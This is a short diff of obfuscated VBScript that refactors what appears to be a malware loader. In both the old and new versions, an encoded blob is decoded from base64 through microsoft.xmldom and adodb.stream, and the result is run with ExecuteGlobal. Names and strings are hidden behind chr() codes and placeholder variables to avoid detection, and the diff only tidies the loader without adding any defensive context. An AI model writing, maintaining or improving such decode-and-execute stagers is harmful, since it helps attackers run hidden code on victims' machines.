@@ -25,15 +25,15 @@ variavel2 = Replace(variavel1(0), variavel1(1), variavel1(2))
 Set variavel3 = CreateObject("microsoft.xmldom")
 variavel1 = Array(variavel2, "ktc", variavel3, Array(chr(98) & chr(97), chr(115) & chr(101), chr(54) & chr(52)))
 
-variavel1 = Array(CreateObject("adodb.stream"), objClasse1.funcao1(variavel1), "us-ascii")
-variavel1(0).Type = 1
-variavel1(0).Open
-variavel1(0).Write variavel1(1)(0)
-variavel1(0).Position = 0
-variavel1(0).Type = 2
-variavel1(0).CharSet = variavel1(2)
+variavel4 = objClasse1.funcao1(variavel1)
+adodb = CreateObject("adodb.stream")
+adodb.Type = 1
+adodb.Open
+adodb.Write variavel4(0)
+adodb.Position = 0
+adodb.Type = 2
+adodb.CharSet = "us-ascii"
 
-
-If chr(97) = "a" And variavel1(0).CharSet = "us-ascii" Then
-	ExecuteGlobal objClasse1.getInfo(variavel1(0))(0)
+If chr(97) = "a" And adodb.CharSet = "us-ascii" Then
+	ExecuteGlobal objClasse1.getInfo(adodb)(0)
 End If
